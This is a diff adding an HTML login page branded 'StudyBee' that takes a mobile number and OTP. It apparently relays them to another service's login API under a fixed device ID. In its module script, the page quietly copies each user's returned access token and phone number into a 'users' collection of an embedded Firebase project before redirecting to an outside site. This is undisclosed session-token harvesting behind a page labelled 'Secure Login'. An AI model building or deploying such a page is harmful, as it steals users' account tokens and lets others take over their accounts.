@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>StudyBee 🐝 | Secure Login</title>
+    
+    <link rel="icon" href="https://i.ibb.co/yF4mhNPB/f493d534-fbf8-4b31-b741-83b343f8a9e1.jpg" type="image/jpeg">  
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Syne:wght@600;700;800;900&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        themeBg: '#050505',
+                        cardBg: 'rgba(12, 12, 14, 0.75)',
+                        themeYellow: '#FACC15',
+                        themeAmber: '#F59E0B',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                        syne: ['Syne', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { 
+            background-color: #050505; 
+            color: #e5e5e5; 
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        .bg-ambient {
+            background: 
+                radial-gradient(ellipse 80% 50% at 50% -20%, rgba(250, 204, 21, 0.08), transparent),
+                radial-gradient(ellipse 60% 40% at 100% 100%, rgba(245, 158, 11, 0.04), transparent),
+                #050505;
+        }
+        
+        .btn-click-effect { transition: transform 0.15s cubic-bezier(0.4, 0, 0.2, 1); }
+        .btn-click-effect:active { transform: scale(0.92); }
+        
+        .nav-glass {
+            background: rgba(5, 5, 5, 0.8);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+        
+        /* Modal / Card Animations */
+        .modal-glass {
+            background: rgba(10, 10, 12, 0.85);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(250, 204, 21, 0.2);
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(250, 204, 21, 0.05);
+        }
+        .animate-modal-in {
+            animation: modalIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+        @keyframes modalIn {
+            0% { opacity: 0; transform: scale(0.9) translateY(30px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+    </style>
+</head>
+<body class="min-h-screen relative flex flex-col font-sans bg-ambient">
+    
+    <!-- Navbar (Simplified) -->
+    <nav class="w-full z-40 nav-glass h-[80px] sticky top-0 shadow-[0_10px_30px_rgba(0,0,0,0.5)]">
+        <div class="max-w-[90rem] mx-auto px-4 sm:px-6 h-full flex items-center justify-center sm:justify-start">
+            <div class="flex items-center gap-3 cursor-pointer group">
+                <div class="relative w-11 h-11 flex items-center justify-center">
+                    <div class="absolute inset-0 bg-themeYellow/30 rounded-xl group-hover:bg-themeYellow/50 transition-all duration-500 blur-md group-hover:blur-lg animate-pulse"></div>
+                    <div class="w-11 h-11 bg-black border border-themeYellow/50 rounded-xl flex items-center justify-center relative z-10 shadow-[0_0_20px_rgba(250,204,21,0.3)]">
+                        <img src="https://i.ibb.co/yF4mhNPB/f493d534-fbf8-4b31-b741-83b343f8a9e1.jpg" alt="Logo" class="w-7 h-7 rounded-md">
+                    </div>
+                </div>
+                <h1 class="text-2xl font-black tracking-[0.1em] text-white font-syne drop-shadow-lg">STUDY<span class="text-transparent bg-clip-text bg-gradient-to-r from-themeYellow to-themeAmber">BEE</span></h1>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content (Login Card) -->
+    <main class="flex-1 w-full max-w-md mx-auto px-4 flex items-center justify-center min-h-[calc(100vh-80px)] relative z-10 pb-12">
+        <div class="modal-glass w-full rounded-3xl p-8 relative z-10 animate-modal-in overflow-hidden">
+            <!-- Glow Effect -->
+            <div class="absolute -top-20 -right-20 w-40 h-40 bg-themeYellow/20 rounded-full blur-[50px] pointer-events-none"></div>
+
+            <div class="text-center mb-8 relative z-10">
+                <div class="w-16 h-16 bg-black border border-themeYellow/30 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-[0_0_20px_rgba(250,204,21,0.2)]">
+                    <i data-lucide="shield-check" class="w-8 h-8 text-themeYellow"></i>
+                </div>
+                <h2 class="text-2xl font-black text-white font-syne tracking-wide">Secure Login</h2>
+                <p class="text-stone-400 text-sm mt-1" id="authStatusText">Enter mobile to access platform</p>
+            </div>
+
+            <!-- Step 1: Mobile -->
+            <div id="authStep1" class="relative z-10">
+                <div class="relative mb-5">
+                    <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                        <i data-lucide="smartphone" class="w-5 h-5 text-stone-500"></i>
+                    </div>
+                    <input type="number" id="mobileInput" placeholder="Mobile Number" 
+                        class="w-full bg-[#050505] border border-white/10 text-white font-bold rounded-xl block pl-12 pr-4 py-4 transition-all placeholder:text-stone-600 focus:outline-none focus:border-themeYellow/50 focus:ring-1 focus:ring-themeYellow/50 shadow-inner">
+                </div>
+                <button onclick="sendAuthOTP()" id="sendOtpBtn" class="w-full bg-gradient-to-r from-themeYellow to-themeAmber text-black font-black py-4 rounded-xl uppercase tracking-widest text-sm hover:shadow-[0_0_20px_rgba(250,204,21,0.4)] transition-all btn-click-effect flex justify-center items-center gap-2">
+                    Send OTP <i data-lucide="arrow-right" class="w-4 h-4"></i>
+                </button>
+            </div>
+
+            <!-- Step 2: OTP -->
+            <div id="authStep2" class="relative z-10 hidden">
+                <div class="relative mb-5">
+                    <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                        <i data-lucide="key-round" class="w-5 h-5 text-stone-500"></i>
+                    </div>
+                    <input type="number" id="otpInput" placeholder="Enter 6-digit OTP" 
+                        class="w-full bg-[#050505] border border-white/10 text-white font-bold tracking-[0.2em] rounded-xl block pl-12 pr-4 py-4 transition-all placeholder:text-stone-600 focus:outline-none focus:border-themeYellow/50 focus:ring-1 focus:ring-themeYellow/50 shadow-inner text-center">
+                </div>
+                <button onclick="verifyAuthOTP()" id="verifyOtpBtn" class="w-full bg-gradient-to-r from-themeYellow to-themeAmber text-black font-black py-4 rounded-xl uppercase tracking-widest text-sm hover:shadow-[0_0_20px_rgba(250,204,21,0.4)] transition-all btn-click-effect flex justify-center items-center gap-2">
+                    Verify & Proceed <i data-lucide="unlock" class="w-4 h-4"></i>
+                </button>
+                <button onclick="resetAuth()" class="w-full text-center text-stone-500 text-xs font-bold uppercase tracking-wider mt-5 hover:text-white transition-colors">
+                    Change Mobile Number
+                </button>
+            </div>
+
+            <!-- Alert Box -->
+            <div id="authAlert" class="mt-4 p-3 rounded-lg hidden text-xs font-bold text-center border"></div>
+        </div>
+    </main>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCMjbTyzDNLZ_SUQ2NB2GdU9LPkcpIIXLs",
+            authDomain: "smexweb.firebaseapp.com",
+            databaseURL: "https://smexweb-default-rtdb.asia-southeast1.firebasedatabase.app", 
+            projectId: "smexweb",
+            storageBucket: "smexweb.firebasestorage.app",
+            messagingSenderId: "987185892638",
+            appId: "1:987185892638:web:0f0fe1ddfbfd2555910d0f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Keep Firebase saving logic accessible globally
+        window.saveUserToFirebase = async (mobile, token) => {
+            try {
+                const userRef = doc(db, 'users', mobile);
+                await setDoc(userRef, {
+                    mobile: mobile,
+                    accessToken: token,
+                    lastLogin: new Date().toISOString()
+                }, { merge: true });
+                console.log("✅ User data saved to Firestore successfully.");
+            } catch (error) {
+                console.error("❌ Firestore save error:", error);
+            }
+        };
+    </script>
+
+    <script>
+        lucide.createIcons();
+
+        // Target redirect URL 
+        const REDIRECT_URL = "https://nt.studybeepro.site/nt";
+        const DEVICE_ID = "6cfad26f-4619-4c90-9dc9-37e616bc3e7b"; 
+
+        // Check if user is already logged in on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            const token = localStorage.getItem('studybee_token');
+            if (token) {
+                // User is already logged in, redirect immediately
+                window.location.href = REDIRECT_URL;
+            }
+        });
+
+        function showAuthAlert(msg, isError = false) {
+            const alertBox = document.getElementById('authAlert');
+            alertBox.classList.remove('hidden', 'bg-red-900/30', 'border-red-500/50', 'text-red-400', 'bg-green-900/30', 'border-green-500/50', 'text-green-400');
+            
+            if (isError) {
+                alertBox.classList.add('bg-red-900/30', 'border-red-500/50', 'text-red-400');
+            } else {
+                alertBox.classList.add('bg-green-900/30', 'border-green-500/50', 'text-green-400');
+            }
+            alertBox.innerText = msg;
+        }
+
+        window.resetAuth = function() {
+            document.getElementById('authStep1').classList.remove('hidden');
+            document.getElementById('authStep2').classList.add('hidden');
+            document.getElementById('authAlert').classList.add('hidden');
+            document.getElementById('otpInput').value = '';
+            document.getElementById('authStatusText').innerText = "Enter mobile to access platform";
+        };
+
+        window.sendAuthOTP = async function() {
+            const mobile = document.getElementById('mobileInput').value;
+            if (!mobile || mobile.length < 10) {
+                return showAuthAlert("Please enter a valid 10-digit mobile number.", true);
+            }
+
+            const btn = document.getElementById('sendOtpBtn');
+            const originalHtml = btn.innerHTML;
+            btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> Sending...`;
+            btn.disabled = true;
+            lucide.createIcons();
+
+            try {
+                const res = await fetch(`/api/api`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        action: "check_user",
+                        mobile: mobile,
+                        device_id: DEVICE_ID,
+                        mobile_otp_login: 1,
+                        otp: ""
+                    })
+                });
+                
+                const data = await res.json();
+                
+                if (data.success) {
+                    document.getElementById('authStep1').classList.add('hidden');
+                    document.getElementById('authStep2').classList.remove('hidden');
+                    document.getElementById('authStatusText').innerText = `OTP sent to +91 ${mobile}`;
+                    showAuthAlert("OTP Sent Successfully!");
+                } else {
+                    showAuthAlert(data.message || "Failed to send OTP", true);
+                }
+            } catch (err) {
+                showAuthAlert("Network Error. Please try again.", true);
+            } finally {
+                btn.innerHTML = originalHtml;
+                btn.disabled = false;
+                lucide.createIcons();
+            }
+        };
+
+        window.verifyAuthOTP = async function() {
+            const mobile = document.getElementById('mobileInput').value;
+            const otp = document.getElementById('otpInput').value;
+            
+            if (!otp || otp.length < 4) {
+                return showAuthAlert("Please enter a valid OTP.", true);
+            }
+
+            const btn = document.getElementById('verifyOtpBtn');
+            const originalHtml = btn.innerHTML;
+            btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> Verifying...`;
+            btn.disabled = true;
+            lucide.createIcons();
+
+            try {
+                const res = await fetch(`/api/api`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        action: "verify_otp",
+                        mobile: mobile,
+                        otp: otp,
+                        signup_needed: "0",
+                        device_id: DEVICE_ID
+                    })
+                });
+                
+                const data = await res.json();
+                
+                if (data.success && data.data && data.data.accessToken) {
+                    const token = data.data.accessToken;
+                    showAuthAlert("Login Successful! Redirecting to Dashboard...");
+                    
+                    // Save to local storage
+                    localStorage.setItem('studybee_token', token);
+                    localStorage.setItem('studybee_mobile', mobile);
+
+                    // Save to Firebase
+                    if (window.saveUserToFirebase) {
+                        await window.saveUserToFirebase(mobile, token);
+                    }
+                    
+                    // Redirect to the target URL
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1000);
+
+                } else {
+                    showAuthAlert(data.message || "Invalid OTP", true);
+                }
+            } catch (err) {
+                showAuthAlert("Network Error. Please try again.", true);
+            } finally {
+                btn.innerHTML = originalHtml;
+                btn.disabled = false;
+                lucide.createIcons();
+            }
+        };
+    </script>
+</body>
+</html>
